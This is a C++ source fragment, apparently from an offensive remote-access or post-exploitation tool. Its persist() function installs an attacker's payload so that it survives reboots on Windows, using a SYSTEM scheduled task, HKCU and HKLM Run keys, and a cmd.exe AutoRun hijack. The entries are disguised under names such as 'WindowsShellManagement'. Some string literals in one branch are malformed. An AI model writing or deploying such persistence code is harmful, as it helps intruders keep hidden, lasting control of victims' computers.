using namespace std;



string persist(string type, string payl_loc) {
	string color_RED = "\033[91m";
	string color_GRE = "\033[92m";
	string color_YELL = "\033[93m";;
	string color_reset = "\033[0m";
	string GRE_plus = color_GRE + "[+] " + color_reset;
	string YELL_exclm = color_YELL + "[!] " + color_reset;
	string RED_exclm = color_RED + "[!] " + color_reset;

	if (type == "tasksch") {
		if (perms() == "Admin") {
			return cmd("schtasks /create /tn WindowsShellManagement /tr " + payl_loc + " /sc onlogon /ru System");
		}
		else {
			return YELL_exclm + "Admin perms required for this"; 
		}

	}
	else if (type == "hkcu") {
		try {
			HKEY hKey;
			RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey); 
			RegSetValueExA(hKey, "WindowsShellManagement", 0, REG_SZ, (BYTE*)payl_loc.c_str(), payl_loc.length());
			RegCloseKey(hKey);

			return GRE_plus + "HKCU persistance created!";
		}
		catch (...) {
			return RED_exclm + "Error creating HKCU key";
		}

	}
	else if (type == "hkcu-cmd") {
		string hkcmd = "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsShellManagement /t REG_SZ /d " + payl_loc;
		system(hkcmd.c_str());
		return GRE_plus + "HKCU persistance created!";

	}
	else if (type == "hklm") {
		if (perms() == "Admin") {
			try {
				string command = "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsShellManagement /t REG_SZ /d " + payl_loc;
				system(command.c_str());

				return GRE_plus + "HKLM persistance created!";
			}
			catch (...) {
				return RED_exclm + "Error creating HKLM key";
			}
		}
		else {
			return YELL_exclm + "Admin perms required for this";
		}

	}
	else if (type == "cmd") {
		try {
			string cmdpth = "C:\\WINDOWS\\system32\\cmd.exe";
			string command = "start \"\" " + payl_loc;
			HKEY hKey;
			RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
			RegSetValueExA(hKey, "Command Prompt", 0, REG_SZ, (BYTE*)cmdpth.c_str(), cmdpth.length());
			RegCloseKey(hKey);

			wstring s = wstring(string("Software\\Microsoft\\Command Processor").begin(), string("Software\\Microsoft\\Command Processor").end());
			HKEY hKey1;
			RegCreateKey(HKEY_CURRENT_USER, s.c_str(), &hKey1);
			RegSetValueExA(hKey1,"AutoRun", 0, REG_SZ, (BYTE*)command.c_str(), command.length());
			RegCloseKey(hKey1);

			return GRE_plus + "cmd persistance created!";
		}
		catch (...) {
			return RED_exclm + "Error creating cmd key"; 
		}

	}
	else if (type == "cmd-cmd") {
		string cmd = "reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v \"Command Prompt\" /t REG_SZ /d C:\Windows\System32\cmd.exe";
		system(cmd.c_str());
		cmd = "reg add \"HKEY_CURRENT_USER\Software\Microsoft\Command Processor\" /v AutoRun /t REG_SZ /d \"start" + payl_loc + "\"";
		system(cmd.c_str());
		return GRE_plus + "cmd persistance created!";


	}
	else {
		return YELL_exclm + "Invalid type";
	}

}